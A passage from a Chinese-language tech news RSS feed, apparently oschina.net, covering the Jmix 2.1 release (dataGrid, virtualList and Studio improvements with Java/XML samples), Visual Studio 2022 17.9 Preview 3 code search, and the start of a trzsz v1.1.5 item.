&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;/<span style="color:#aa0d91">actions</span>&gt;</span></code></pre><p style="color:black; margin-left:0; margin-right:0">此操作将打开一个对话框，用户可以输入属性的值。所有选定的实体实例都将更新这些属性：</p><p><img alt="批量编辑" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/bulk_edit.png" referrerpolicy="no-referrer"></p><h3><span>JMX 控制枱</span></h3><p style="color:black; margin-left:0; margin-right:0"><strong>JMX 控制枱</strong> 扩展组件为 Java JMX API 提供了 Web 页面。系统管理员可以直接在应用程序 UI 中检查 JMX bean、编辑属性和调用操作：</p><p><img alt="JMX 控制枱" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/jmx_console_2.png" referrerpolicy="no-referrer"></p><h2><span style="color:#fe8a34">BPM 改进</span></h2><p style="color:black; margin-left:0; margin-right:0">在应用程序 UI 中现在可以使用 DMN 表建模器了：</p><p><img alt="DMN 表建模器" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/dmn_modeler.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">流程表单向导现在可以生成功能完备的视图，用于编辑流程变量和选择输出结果。</p><p style="color:black; margin-left:0; margin-right:0">向导能显示流程中定义的变量：</p><p><img alt="Alt text" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/bpm_form_wizard_1.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">并支持定义输出：</p><p><img alt="Alt text" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/bpm_form_wizard_2.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">根据你的选择，向导会在视图中生成代码，将流程变量注入 UI 组件，并使用所选的输出完成任务：</p><pre><code><span style="color:#643820">@ProcessForm</span>(outcomes&nbsp;=&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#643820">@Outcome</span>(id&nbsp;=&nbsp;<span style="color:#c41a16">"submit"</span>),&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#643820">@Outcome</span>(id&nbsp;=&nbsp;<span style="color:#c41a16">"reject"</span>)&nbsp;&nbsp;
})
<span style="color:#007400">//&nbsp;...</span><span style="color:#aa0d91">public</span>&nbsp;<span><span style="color:#aa0d91">class</span>&nbsp;<span style="color:#5c2699">BpmProcessForm</span>&nbsp;<span style="color:#aa0d91">extends</span>&nbsp;<span style="color:#5c2699">StandardView</span>&nbsp;</span>{&nbsp;&nbsp;
&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#643820">@Autowired</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">private</span>&nbsp;ProcessFormContext&nbsp;processFormContext;&nbsp;&nbsp;
&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#643820">@ProcessVariable</span>&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#643820">@ViewComponent</span>&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">private</span>&nbsp;EntityPicker&lt;Book&gt;&nbsp;book;&nbsp;&nbsp;

&nbsp;<span style="color:#007400">//&nbsp;...&nbsp;</span>
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#643820">@Subscribe</span>(<span style="color:#c41a16">"submitBtn"</span>)&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span><span style="color:#aa0d91">protected</span>&nbsp;<span style="color:#aa0d91">void</span>&nbsp;<span style="color:#1c00cf">onSubmitBtnClick</span><span style="color:#5c2699">(ClickEvent&lt;JmixButton&gt;&nbsp;event)</span>&nbsp;</span>{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processFormContext.taskCompletion()&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.withOutcome(<span style="color:#c41a16">"submit"</span>)&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.saveInjectedProcessVariables()&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.complete();&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;closeWithDefaultAction();&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
</code></pre><h2><span style="color:#fe8a34">dataGrid 改进</span></h2><p style="color:black; margin-left:0; margin-right:0">该版本中，对 <code>dataGrid</code> 组件进行了增强，<code>dataGrid</code> 主要用于展示表格数据。</p><p style="color:black; margin-left:0; margin-right:0">现在，用户可以对 <code>dataGrid</code> 进行多列排序。列排序的顺序由排序箭头旁边显示的数字表示：</p><p><img alt="数据网格排序" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/data_grid_sort_1.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">排序由 <code>dataGrid</code> 组件的 <code>multiSort</code>、<code>multiSortOnShiftClickOnly</code> 和 <code>multiSortPriority</code> 属性定义。</p><p style="color:black; margin-left:0; margin-right:0">另一个新功能是可以在行内计算聚合值。需要配置聚合列时，请将 <code>dataGrid</code> 组件的 <code>aggregatable</code> 属性设置为 <code>true</code>，将 <code>aggregation</code> 元素添加到列中并选择聚合类型。聚合值将显示在单独的行中：</p><p><img alt="数据网格聚合" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/data_grid_aggregation_1.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">下一个改进是能够声明式地将渲染器分配给 <code>dataGrid</code> 列。如果你熟悉 Jmix Classic UI，那你可能会发现带有声明式渲染器的列与 Classic UI 中的「生成列」非常相似。在 XML 中定义某个列，然后创建一个返回渲染器的处理方法：</p><pre><code><span style="color:#643820">@Supply</span>(to&nbsp;=&nbsp;<span style="color:#c41a16">"stepsDataGrid.completed"</span>,&nbsp;subject&nbsp;=&nbsp;<span style="color:#c41a16">"renderer"</span>)&nbsp;&nbsp;
<span><span style="color:#aa0d91">private</span>&nbsp;Renderer&lt;UserStep&gt;&nbsp;<span style="color:#1c00cf">stepsDataGridCompletedRenderer</span><span style="color:#5c2699">()</span>&nbsp;</span>{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">return</span>&nbsp;<span style="color:#aa0d91">new</span>&nbsp;ComponentRenderer&lt;&gt;(userStep&nbsp;-&gt;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#007400">//&nbsp;...</span>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">return</span>&nbsp;checkbox;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;});
}&nbsp;
</code></pre><p style="color:black; margin-left:0; margin-right:0">框架中预定义了几个用于设置日期和数字格式的渲染器，可以在 XML 的列中使用。还有，现在可以在 XML 中定义不绑定实体属性的列，仅用于为其声明渲染器。</p><p style="color:black; margin-left:0; margin-right:0">也许数据网格的改进中最令人兴奋的新功能是表头过滤器。可以使用 <code>column</code> XML 元素的 <code>filterable</code> 属性来定义哪些列支持过滤。可过滤列的标题中带有「漏斗」图标。如果用户单击此图标，则会显示一个包含属性过滤器的弹窗：</p><p><img alt="数据网格过滤 1" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/data_grid_filter_1.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">如果设置了过滤条件，表头的图标将高亮显示：</p><p><img alt="数据网格过滤 2" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/data_grid_filter_2.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">表头过滤器这个概念，对于使用包括 Excel 在内的许多流行产品的用户都很熟悉，所以这个功能非常容易被发现和使用。我们认为，这种过滤数据的方式是对其他两个过滤组件的极好补充：<code>genericFilter</code> 和 <code>propertyFilter</code>。<code>genericFilter</code> 组件在运行时是完全可自定义的，并提供高级条件，但可能不是特别容易使用。而 <code>propertyFilter</code> 对用户来说很简单，但需要开发人员事先配置。数据网格的表头过滤器在功能上类似于 <code>propertyFilter</code>，但不占用任何额外的屏幕空间，因此可以成为大多数视图的默认过滤选择。</p><p style="color:black; margin-left:0; margin-right:0">值的一提的是，这三个过滤功能可以在同一视图和数据加载器上一起使用，而不会发生任何冲突。所有过滤器的条件都将使用逻辑 <code>AND</code> 运算符进行简单组合。</p><h2><span style="color:#fe8a34">新的 UI 组件和 Facets</span></h2><h3><span>VirtualList</span></h3><p style="color:black; margin-left:0; margin-right:0">新的 <code>virtualList</code> 组件用于展示任意内容的列表。在页面中，该组件仅渲染当前可见的部分，因此，无论内容多复杂，都能保证有良好的性能。</p><p style="color:black; margin-left:0; margin-right:0"><code>virtualList</code> 可以在视图中替换 <code>dataGrid</code> 使用。在 XML 中定义组件并将与集合数据容器连接：</p><pre><code><span style="color:#aa0d91">&lt;<span style="color:#aa0d91">virtualList</span>&nbsp;<span style="color:#836c28">id</span>=<span style="color:#c41a16">"stepsVirtualList"</span>&nbsp;<span style="color:#836c28">itemsContainer</span>=<span style="color:#c41a16">"stepsDc"</span>/&gt;</span></code></pre><p style="color:black; margin-left:0; margin-right:0">与数据加载器关联的过滤和分页组件（如 <code>genericFilter</code> 和 <code>simplePagination</code>）将直接影响 <code>virtualList</code> 展示的内容，这一点与 <code>dataGrid</code> 一样。</p><p style="color:black; margin-left:0; margin-right:0">然后，需要创建一个展示列表每项内容的处理方法：</p><pre><code><span style="color:#643820">@Supply</span>(to&nbsp;=&nbsp;<span style="color:#c41a16">"stepsVirtualList"</span>,&nbsp;subject&nbsp;=&nbsp;<span style="color:#c41a16">"renderer"</span>)&nbsp;&nbsp;
<span><span style="color:#aa0d91">private</span>&nbsp;Renderer&lt;Step&gt;&nbsp;<span style="color:#1c00cf">stepsVirtualListRenderer</span><span style="color:#5c2699">()</span>&nbsp;</span>{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">return</span>&nbsp;<span style="color:#aa0d91">new</span>&nbsp;ComponentRenderer&lt;&gt;(step&nbsp;-&gt;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#007400">//&nbsp;...</span>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">return</span>&nbsp;hbox;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;});&nbsp;&nbsp;
}
</code></pre><p style="color:black; margin-left:0; margin-right:0">花费一些精力对 <code>virtualList</code> 内容的布局进行编码后，可以获得类似于以下示例的视图：</p><p><img alt="virtualList 组件" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/virtual_list_1.png" referrerpolicy="no-referrer"></p><h3><span>Html</span></h3><p style="color:black; margin-left:0; margin-right:0"><code>html</code> 组件支持将任意 HTML 内容插入到视图中。内容可以定义在内部的 <code>content</code> 元素、项目资源中的文件，或者是消息包中，而以消息包的方式定义可以方便地支持国际化。</p><h3><span>Settings</span></h3><p style="color:black; margin-left:0; margin-right:0"><code>settings</code> facet 支持保存和恢复当前用户的可视化组件的设置，能自动保存 <code>dataGrid</code> 列的参数、详细信息和 <code>genericFilter</code> 的打开状态，以及 <code>simplePagination</code> 选定的页面大小。只需将 facet 拖放到视图并设置其 <code>auto=「true」</code> 属性，facet 将能管理视图中具有标识符的所有支持保存设置的组件。</p><p style="color:black; margin-left:0; margin-right:0"><code>settings</code> facet 还提供处理方法，可以保存和还原视图及其组件的任何属性。</p><h3><span>Timer</span></h3><p style="color:black; margin-left:0; margin-right:0"><code>timer</code> facet 支持以特定的时间间隔运行某些视图代码，其工作在一个可以处理用户界面事件并能更新视图组件的线程中。使用时，在 XML 中定义参数，并为 <code>TimerActionEvent</code> 创建处理方法：</p><pre><code><span style="color:#aa0d91">&lt;<span style="color:#aa0d91">timer</span>&nbsp;<span style="color:#836c28">id</span>=<span style="color:#c41a16">"timer"</span>&nbsp;<span style="color:#836c28">delay</span>=<span style="color:#c41a16">"2000"</span>&nbsp;<span style="color:#836c28">repeating</span>=<span style="color:#c41a16">"true"</span>&nbsp;<span style="color:#836c28">autostart</span>=<span style="color:#c41a16">"true"</span>/&gt;</span></code></pre><pre><code><span style="color:#643820">@Subscribe</span>(<span style="color:#c41a16">"timer"</span>)&nbsp;&nbsp;
<span><span style="color:#aa0d91">public</span>&nbsp;<span style="color:#aa0d91">void</span>&nbsp;<span style="color:#1c00cf">onTimerTimerAction</span><span style="color:#5c2699">(<span style="color:#aa0d91">final</span>&nbsp;Timer.TimerActionEvent&nbsp;event)</span>&nbsp;</span>{
&nbsp;<span style="color:#007400">//&nbsp;...</span>
}
</code></pre><h2><span style="color:#fe8a34">加载下拉列表选项</span></h2><p style="color:black; margin-left:0; margin-right:0">新版本中引入了一种将数据加载到下拉组件中的高效方法，支持 <code>comboBox</code>、<code>entityComboBox</code> 和 <code>multiSelectComboBox</code>。现在，可以不用为组件定义选项的集合数据容器，也无需提前加载完整的选项列表。新的方法是，需要在下拉列表组件中定义 <code>itemsQuery</code> 嵌套标签，并编写类似下面的查询语句：</p><pre><code><span style="color:#aa0d91">&lt;<span style="color:#aa0d91">entityComboBox</span>&nbsp;<span style="color:#836c28">id</span>=<span style="color:#c41a16">"departmentField"</span>&nbsp;<span style="color:#836c28">property</span>=<span style="color:#c41a16">"department"</span>&nbsp;<span style="color:#836c28">pageSize</span>=<span style="color:#c41a16">"30"</span>&gt;</span>
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">itemsQuery</span>&nbsp;<span style="color:#836c28">class</span>=<span style="color:#c41a16">"com.company.onboarding.entity.Department"</span>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#836c28">fetchPlan</span>=<span style="color:#c41a16">"_instance_name"</span>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#836c28">searchStringFormat</span>=<span style="color:#c41a16">"(?i)%${inputString}%"</span>&gt;</span>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;<span style="color:#aa0d91">query</span>&gt;</span>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;![CDATA[select&nbsp;e&nbsp;from&nbsp;Department&nbsp;e&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;where&nbsp;e.name&nbsp;like&nbsp;:searchString&nbsp;order&nbsp;by&nbsp;e.name]]&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;/<span style="color:#aa0d91">query</span>&gt;</span>
&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#aa0d91">&lt;/<span style="color:#aa0d91">itemsQuery</span>&gt;</span><span style="color:#aa0d91">&lt;/<span style="color:#aa0d91">entityComboBox</span>&gt;</span></code></pre><p style="color:black; margin-left:0; margin-right:0">当用户打开下拉列表时，将执行查询语句，并返回最多 <code>pageSize</code> 行（默认为 50）数据作为选项。当用户滚动选项列表时，将分页加载数据。如果用户在控件中输入一些文本，还可以按文本过滤选项。</p><p style="color:black; margin-left:0; margin-right:0">除了在 XML 中编写 JPQL 查询语句外，还可以定义 <code>itemsFetchCallback</code> 处理方法并通过编程的方式从任何源加载数据。</p><p style="color:black; margin-left:0; margin-right:0">与使用单独的集合数据容器的旧方法相比，<code>itemsQuery</code> 可以在数据量比较大的时候提供更好的性能。<code>itemsQuery</code> 支持分批加载选项，从而可以减少内存的使用量，并支持在数据存储级别进行数据过滤。因此，这种方法可以支持几乎任何大小的数据集作为下拉列表中的选项来源。</p><p style="color:black; margin-left:0; margin-right:0">话又说回来，对于较小的数据集，使用单独的预加载集合容器仍然是更好的选择，因为响应更快。</p><h2><span style="color:#fe8a34">视图设计器的改进</span></h2><p style="color:black; margin-left:0; margin-right:0">下面我们看一下 Studio 中的新功能和改进。</p><p style="color:black; margin-left:0; margin-right:0">Studio 中最明显的变化可能是包含了组件的层次结构和属性的 Jmix UI 工具窗口。这个窗口现在支持与页面的 Java controller 同时打开并使用各种操作，而无需打开页面的 XML。</p><p style="color:black; margin-left:0; margin-right:0">这样一来，在控制器中编写 Java 代码时，查看组件树、更改组件属性甚至添加新组件都非常方便。</p><p><img alt="视图设计器" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/view_designer_1.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">另外，对 <strong>Preview</strong>（预览）面板也进行了改进。</p><p style="color:black; margin-left:0; margin-right:0">我们都知道，显示页面的预览效果需要构建前端并启动 Vaadin 服务的开发模式，这个过程可能非常耗时。为了节省打开项目的时间，现在只有在 XML 编辑器顶部面板中点击 <strong>Start Preview</strong> 按钮时，才会打开预览面板。面板打开后，项目中后续所有打开的视图都将展示在预览面板中。要停止预览，只需单击 <strong>Stop Preview</strong>。</p><p style="color:black; margin-left:0; margin-right:0">我们还做了大量工作，将预览功能与其他可视化设计器机制进行拆分。因为预览面板使用 JCEF 嵌入式浏览器，该浏览器对项目、IDE 和操作系统的非标准配置的细微差别很敏感，容易出现问题。现在，即使预览面板出问题也不会影响 Jmix UI 工具窗口和代码生成功能。</p><h2><span style="color:#fe8a34">代码辅助</span></h2><p style="color:black; margin-left:0; margin-right:0">在此版本中，我们引入了在视图类和 Spring bean 中注入依赖和 UI 组件的全新方法。</p><p style="color:black; margin-left:0; margin-right:0">一旦你在方法体中开始输入字符，则会出现一个代码自动完成的下拉列表，其中显示了可用的 bean、UI 组件、局部变量和类字段。尚未注入到类中的 Bean 和 UI 组件将以斜体字显示。如果选择其中一项，则将自动注入到构造函数或使用特定注解（<code>@Autowired</code> 或 <code>@ViewComponent</code>）的字段中，于是能立即在当前光标位置使用。</p><p><img alt="代码辅助" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/inject_by_code_completion_1.gif" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">有了这个功能，查找和注入可用的 bean 和 UI 组件就变得非常容易了。希望你喜欢这个小改进 😄</p><h2><span style="color:#fe8a34">支持 Data Repositories</span></h2><p style="color:black; margin-left:0; margin-right:0">Studio 现在能对创建和管理 Spring Data repositories 提供完整的支持。</p><p style="color:black; margin-left:0; margin-right:0">通过点击 Jmix 窗口工具栏中的 <strong>New</strong> → <strong>Data Repository</strong> 创建 repository。Studio 将创建 repository 的接口并将其显示在实体节点下。</p><p style="color:black; margin-left:0; margin-right:0">使用 repository 代码编辑器操作面板中的 <strong>Add Derived Method</strong> 和 <strong>Add Query Method</strong> 按钮可以创建具有派生查询或显式查询的方法：</p><p><img alt="Data Repositories 1" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/data_repositories_1.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">对于 repository 的已有方法，Studio 会显示一个侧边栏图标，支持调整方法参数，例如添加排序或 fetch plan：</p><p><img alt="Data Repositories 2" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/data_repositories_2.png" referrerpolicy="no-referrer"></p><h2><span style="color:#fe8a34">数据模型备注</span></h2><p style="color:black; margin-left:0; margin-right:0">本文中想强调的另一个功能是支持为实体及其属性添加备注。</p><p style="color:black; margin-left:0; margin-right:0">实体设计器现在包含实体和每个属性的 <strong>Comment</strong> 字段。可以设置备注，备注将显示在字段中：</p><p><img alt="数据模型备注" src="https://cdn.abmcode.com/zh-cn/jmix/releases/_media/jmix-2.1/data_model_comment_1.png" referrerpolicy="no-referrer"></p><p style="color:black; margin-left:0; margin-right:0">在设计器中输入的文本存储在实体类及其字段的 <code>@Comment</code> 注解中：</p><pre><code><span style="color:#643820">@Comment</span>(<span style="color:#c41a16">""</span><span style="color:#c41a16">"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Stores&nbsp;information&nbsp;about&nbsp;books.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Has&nbsp;reference&nbsp;to&nbsp;Genre."</span><span style="color:#c41a16">""</span>)
<span style="color:#643820">@JmixEntity</span><span style="color:#643820">@Table</span>(name&nbsp;=&nbsp;<span style="color:#c41a16">"BOOK"</span>)
<span style="color:#643820">@Entity</span><span style="color:#aa0d91">public</span>&nbsp;<span><span style="color:#aa0d91">class</span>&nbsp;<span style="color:#5c2699">Book</span>&nbsp;</span>{
&nbsp;<span style="color:#007400">//&nbsp;...</span>
&nbsp;
&nbsp;<span style="color:#643820">@Comment</span>(<span style="color:#c41a16">"Book&nbsp;title"</span>)
&nbsp;<span style="color:#643820">@Column</span>(name&nbsp;=&nbsp;<span style="color:#c41a16">"TITLE"</span>,&nbsp;nullable&nbsp;=&nbsp;<span style="color:#aa0d91">false</span>)&nbsp;&nbsp;
&nbsp;<span style="color:#aa0d91">private</span>&nbsp;String&nbsp;title;
</code></pre><p style="color:black; margin-left:0; margin-right:0">Studio 会生成 <code>setTableRemarks</code> 和 <code>setColumnRemarks</code> Liquibase 变更日志操作，可以将备注保存在数据库结构中（适用于除 HSQL 之外的所有数据库）。这样可以通过任何数据库工具查看备注。还可以从元数据中提取备注或直接从类注解中提取备注，以便在应用程序 UI 中显示或生成文档。</p><h2><span style="color:#fe8a34">下一步？</span></h2><p style="color:black; margin-left:0; margin-right:0">在计划于 2024 年 2 月发布的下一个功能版本中，我们将实现新的 Charts 扩展组件，并完成 Maps 扩展组件中的剩余功能。UI 层方面，我们将添加 <code>RichTextArea</code>、水平主菜单以及搜索主菜单的功能。我们还将简化在 UI 视图中使用 Data Repository。</p><p style="color:black; margin-left:0; margin-right:0">在 Studio 方面，我们将提供 BPMN 业务流程定义的热部署、生成自定义 REST controller，以及提供实体和视图集成测试的样板代码。</p><p style="color:black; margin-left:0; margin-right:0">我们未来版本的详细路线图在 <a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Forgs%2Fjmix-framework%2Fprojects%2F5" target="_blank">GitHub 项目</a> 中。针对 2.1 的补丁版本将大约每月发布一次，以保持定期更新。</p><p style="color:black; margin-left:0; margin-right:0">感谢所有提供想法、建议和错误报告的亲们！</p></div>
                                    ]]>
            </description>
            <pubDate>Mon, 22 Jan 2024 08:47:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276365/jmix-2-1</guid>
            <link>https://www.oschina.net/news/276365/jmix-2-1</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[Visual Studio 2022 17.9 Preview 3 发布]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p>Visual Studio 2022 17.9 Preview 3 现已发布。此版本增强了 Code Search（也称为 All-In-One Search）体验，现在用户可以在整个解决方案中搜索任何单词或字符串，对代码库中的文件和符号结果进行补充。并且可以搜索代码库中的局部变量名称、注释中的单词、参数名称或任何其他字符串。</p><p>新增的文本支持将有助于完善使用 Code Search 的体验。更专业的文本搜索体验，可在 <span style="background-color:#ffffff; color:#333333">Find in Files (Ctrl+Shift+F)<span>&nbsp;</span></span>&nbsp;和 <span style="background-color:#ffffff; color:#333333">Quick Find (Ctrl+F)<span>&nbsp;</span></span>中可获取更多选项和功能。</p><p><img alt="" height="324" src="https://oscimg.oschina.net/oscnet/up-820f75d056a71a0f336d9f2b66556367c6c.png" width="500" referrerpolicy="no-referrer"></p><p style="text-align:left"><span><span><span><span><span style="color:#333333"><span><span><span><span><span><span><span><span><span><span><span><span style="background-color:#ffffff"><span><span><span>默认的 &nbsp;Code Search 体验（Ctrl+T 或 Ctrl+,）将在适用时包含精确的文本匹配，包括以前未包括的注释和局部变量等项目。与 files、types 和 members 相比，文本结果的优先级较低，因此不会影响当前的工作流程。</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><p style="text-align:left"><span><span><span><span><span style="color:#333333"><span><span><span><span><span><span><span><span><span><span><span><span style="background-color:#ffffff"><span><span><span>对于 </span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style="background-color:#ffffff; color:#333333">text-only&nbsp;</span><span><span><span><span><span style="color:#333333"><span><span><span><span><span><span><span><span><span><span><span><span style="background-color:#ffffff"><span><span><span>视图，可以通过执行以下操作之一筛选出纯文本结果：</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>单击 search bow 下方的 「text (x:)」 按钮，</li><li>在搜索查询前加上「x:」前缀，</li><li>使用键盘快捷键「Shift+Alt+F」，或者</li><li>转到菜单选项「Edit &gt; Go To &gt; Go To Text」。</li></ul><p style="text-align:left"><span><span><span><span><span style="color:#333333"><span><span><span><span><span><span><span><span><span><span><span><span style="background-color:#ffffff"><span><span><span>在 text-only&nbsp;体验中，还可以通过搜索栏最右侧的按钮切换「Match case」、「Match whole word」和「Use regular expressions」。</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><p style="text-align:left"><span><span><span><span><span style="color:#333333"><span><span><span><span><span><span><span><span><span><span><span><span style="background-color:#ffffff"><span><span><span><img alt="" height="324" src="https://oscimg.oschina.net/oscnet/up-959a0534f74574e5f1b4d52a4608423dda3.png" width="500" referrerpolicy="no-referrer"></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><p style="text-align:left"><span style="background-color:#ffffff; color:#333333">详情可<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fdevblogs.microsoft.com%2Fvisualstudio%2F17-9-preview-3-brings-exciting-changes-to-code-search%2F" target="_blank">查看</a></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fdevblogs.microsoft.com%2Fvisualstudio%2F17-9-preview-3-brings-exciting-changes-to-code-search%2F" target="_blank">更新公告</a><span style="background-color:#ffffff; color:#333333">。</span></p></div>
                                    ]]>
            </description>
            <pubDate>Mon, 22 Jan 2024 06:23:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276349/visual-studio-2022-17-9-preview3-released</guid>
            <link>https://www.oschina.net/news/276349/visual-studio-2022-17-9-preview3-released</link>
            <author>
                <![CDATA[来源: OSCHINA]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[Python 版 trzsz ( trz / tsz ) 发布 v1.1.5]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p>Python 版 trzsz ( trz / tsz ) 发布 v1.1.5，同步一些 Go 版的特性，如进度条隐藏光标等。</p><p>GitHub:&nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Ftrzsz%2Ftrzsz" target="_blank">https://github.com/trzsz/trzsz</a>&nbsp;<span style="color:#7f8c8d">接近 1K Star 了。</span></p><hr><h2>如何使用</h2><ol><li><p style="margin-left:0; margin-right:0">在服务器上安装<span>&nbsp;</span><code>trzsz</code><span>&nbsp;</span>(trz /tsz)，有<span>&nbsp;</span><a href="https://gitee.com/link?target=https%3A%2F%2Fgithub.com%2Ftrzsz%2Ftrzsz-go">go</a>、<a href="https://gitee.com/link?target=https%3A%2F%2Fgithub.com%2Ftrzsz%2Ftrzsz">py</a><span>&nbsp;</span>和<span>&nbsp;</span><a href="https://gitee.com/link?target=https%3A%2F%2Fgithub.com%2Ftrzsz%2Ftrzsz.js">js</a><span>&nbsp;</span>三种实现，互相兼容。</p></li><li><p style="margin-left:0; margin-right:0">本地要使用支持的终端，有本地 shell 的终端可以使用<span>&nbsp;</span><a href="https://gitee.com/link?target=https%3A%2F%2Fgithub.com%2Ftrzsz%2Ftrzsz-ssh">trzsz-ssh ( tssh )</a>，或参考下文【支持的终端】。</p></li><li><p style="margin-left:0; margin-right:0">使用<span>&nbsp;</span><code>trz</code><span>&nbsp;</span>( 类似<span>&nbsp;</span><code>rz</code><span>&nbsp;</span>) 命令上传文件，使用<span>&nbsp;</span><code>tsz</code><span>&nbsp;</span>( 类似<span>&nbsp;</span><code>sz</code><span>&nbsp;</span>) 命令下载文件。</p></li></ol><h2>为什么做</h2><ul><li><p style="margin-left:0; margin-right:0">考虑<span>&nbsp;</span><code>laptop -&gt; hostA -&gt; hostB -&gt; docker -&gt; 